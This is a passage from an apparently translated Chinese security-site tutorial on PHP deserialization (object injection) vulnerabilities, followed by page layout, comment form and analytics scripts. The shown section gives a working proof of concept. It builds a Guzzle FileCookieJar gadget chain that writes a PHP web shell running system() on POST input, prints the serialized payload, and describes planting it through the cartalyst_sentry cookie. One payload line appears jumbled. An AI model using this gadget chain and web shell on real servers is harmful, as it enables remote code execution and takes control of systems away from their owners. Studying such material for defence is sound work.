+&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到那三个方法只是简单的返回了data数组的特定键值.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.搭建环境进行poc测试</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先在虚拟机里创建这样一个composer.json文件来安装提供POP gadgets的库.</span></p><pre class="brush:plain;toolbar:false">{
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;require&quot;:&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;guzzlehttp/guzzle&quot;:&nbsp;&quot;6.0.2&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后使用这个文件安装库</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0141d83509e6afccd2.png" title="t012d1df5d752bcba71.png" alt="t012d1df5d752bcba71.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后使用这个库,来构造反序列化的payload</span></p><pre class="brush:plain;toolbar:false">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;require&nbsp;__DIR__&nbsp;.&nbsp;&#39;/vendor/autoload.php&#39;;
+&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;GuzzleHttp\Cookie\FileCookieJar;
+&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;GuzzleHttp\Cookie\SetCookie;
+&nbsp;&nbsp;&nbsp;&nbsp;$obj&nbsp;=&nbsp;new&nbsp;FileCookieJar(&#39;/var/www/html/shell.php&#39;);
+&nbsp;&nbsp;&nbsp;&nbsp;$payload&nbsp;=&nbsp;&#39;&lt;?php&nbsp;echo&nbsp;system($_POST[\&#39;poc\&#39;]);&nbsp;?&gt;&#39;;
+&nbsp;&nbsp;&nbsp;&nbsp;$obj-&gt;setCookie(new&nbsp;SetCookie([
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Name&#39;&nbsp;=&gt;&nbsp;&#39;foo&#39;,&nbsp;&#39;Value&#39;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Domain&#39;&nbsp;=&gt;&nbsp;$payload,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&#39;bar&#39;,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Expires&#39;&nbsp;=&gt;&nbsp;time()]));
+&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents(&#39;./built_payload_poc&#39;,&nbsp;serialize($obj));</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行这个文件得到payload</span></p><pre class="brush:plain;toolbar:false">#&nbsp;php&nbsp;build_payload.php
+#&nbsp;cat&nbsp;built_payload_poc
+O:31:&quot;GuzzleHttp\Cookie\FileCookieJar&quot;:3:{s:41:&quot;GuzzleHttp\Cookie\FileCookieJarfilename&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:36:&quot;GuzzleHttp\Cookie\CookieJarcookies&quot;;a:1:{i:1;O:27:&quot;GuzzleHttp\Cookie\SetCookie&quot;:1:{s:33:&quot;GuzzleHttp\Cookie\SetCookiedata&quot;;a:9:{s:4:&quot;Name&quot;;s:3:&quot;foo&quot;;s:5:&quot;Value&quot;;s:3:&quot;bar&quot;;s:6:&quot;Domain&quot;;s:36:&quot;&lt;?php&nbsp;echo&nbsp;system($_POST[&#39;poc&#39;]);?&gt;&quot;;s:4:&quot;Path&quot;;s:1:&quot;/&quot;;s:7:&quot;Max-Age&quot;;N;s:7:&quot;Expires&quot;;i:1450225029;s:6:&quot;Secure&quot;;b:0;s:7:&quot;Discard&quot;;b:0;s:8:&quot;HttpOnly&quot;;b:0;}}}s:39:&quot;GuzzleHttp\Cookie\CookieJarstrictMode&quot;;N;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">payload</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">已经生成,我们在创建一个文件来测试这个</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">payload</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">的结果.</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><pre class="brush:plain;toolbar:false">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;require&nbsp;__DIR__&nbsp;.&nbsp;&#39;/vendor/autoload.php&#39;;
+&nbsp;&nbsp;&nbsp;&nbsp;unserialize(file_get_contents(&quot;./built_payload_poc&quot;));</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个文件的内容很简单,就是把我们刚刚生成的payload反序列化.来看看效果</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01c27ee810bb020a3b.png" title="t01e7e53046d79453d0.png" alt="t01e7e53046d79453d0.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">成功写入一个shell.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.寻找使用了这个漏洞库并且有反序列化操作的程序这里是cartalyst/sentry,然后拿POC去打就好.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">演示:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先网站目录没有shell.php文件</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01ffed72b7f69c4c6d.png" title="t01312cee925ef2bffe.png" alt="t01312cee925ef2bffe.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们将cartalyst_sentry的cookie值设为经过url编码的反序列化payload,然后发送到应用中去.</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01439780644212328e.png" title="t01d52cdff1fee6f1c7.png" alt="t01d52cdff1fee6f1c7.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在shell.php已经出现了</span></p><p style="text-align: center;"><img src="http://p6.qhimg.com/t01eb531e05a985807b.png" title="t01915b9b31efa17564.png" alt="t01915b9b31efa17564.png"/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf" target="_blank">原文链接：https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】PHP反序列化漏洞成因及漏洞挖掘技巧与案例 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3193" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
